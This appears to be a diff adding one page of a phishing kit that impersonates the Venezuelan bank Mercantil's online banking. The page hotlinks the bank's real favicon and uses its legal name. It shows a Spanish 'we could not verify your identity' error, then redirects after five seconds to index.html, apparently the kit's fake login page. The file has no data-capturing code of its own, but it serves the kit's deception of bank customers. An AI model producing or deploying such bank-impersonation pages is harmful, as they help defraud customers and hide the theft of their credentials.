@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #eff3f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── Navbar ── */
+        .nav-bar {
+            background: #004e9b;
+            height: 64px;
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            z-index: 100;
+        }
+        .nav-bar img { height: 36px; width: auto; }
+
+        /* ── Main ── */
+        .main {
+            flex: 1;
+            margin-top: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        /* ── Card ── */
+        .card {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 24px rgba(0,0,0,.1);
+            padding: 48px 36px 40px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        /* ── Error icon ── */
+        .error-icon {
+            width: 72px; height: 72px;
+            margin: 0 auto 24px;
+            background: #fdecea;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .error-icon svg { fill: #e53935; }
+
+        .card-title {
+            color: #e53935;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+        .card-msg {
+            color: #555;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        /* ── Countdown ── */
+        .redirect-msg {
+            font-size: 13px;
+            color: #888;
+        }
+        .redirect-msg span {
+            font-weight: 700;
+            color: #004e9b;
+        }
+
+        /* ── Progress bar ── */
+        .progress-track {
+            background: #e0e0e0;
+            border-radius: 4px;
+            height: 5px;
+            overflow: hidden;
+            margin: 16px 0 20px;
+        }
+        #progressBar {
+            height: 100%;
+            width: 100%;
+            background: #004e9b;
+            border-radius: 4px;
+            transform-origin: left;
+            transform: scaleX(1);
+        }
+        #progressBar.running {
+            transform: scaleX(0);
+            transition: transform var(--dur) linear;
+        }
+
+        /* ── Footer ── */
+        footer {
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+            padding: 14px 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #757575;
+        }
+    </style>
+</head>
+<body>
+
+<nav class="nav-bar">
+    <img src="containersito/Log.png" alt="Mercantil en Línea">
+</nav>
+
+<div class="main">
+    <div class="card">
+        <div class="error-icon">
+            <svg width="36" height="36" viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+            </svg>
+        </div>
+
+        <h1 class="card-title">No pudimos verificar tu identidad</h1>
+        <p class="card-msg">
+            Por razones de seguridad, el acceso ha sido bloqueado temporalmente.
+            Comunícate con tu sucursal o llama a nuestra línea de atención al cliente.
+        </p>
+
+        <div class="progress-track">
+            <div id="progressBar"></div>
+        </div>
+
+        <p class="redirect-msg">
+            Redirigiendo en <span id="countdownNum">5</span> segundos...
+        </p>
+    </div>
+</div>
+
+<footer>
+    <span>Derechos protegidos por Mercantil C.A., Universal. RIF: J-00002961-0.</span>
+</footer>
+
+<script>
+const bar = document.getElementById('progressBar');
+const num = document.getElementById('countdownNum');
+const seconds = 5;
+num.textContent = seconds;
+bar.style.setProperty('--dur', seconds + 's');
+requestAnimationFrame(() => requestAnimationFrame(() => bar.classList.add('running')));
+let remaining = seconds;
+const tick = setInterval(() => {
+    num.textContent = --remaining;
+    if (remaining <= 0) { clearInterval(tick); location.href = 'index.html'; }
+}, 1000);
+</script>
+
+</body>
+</html>
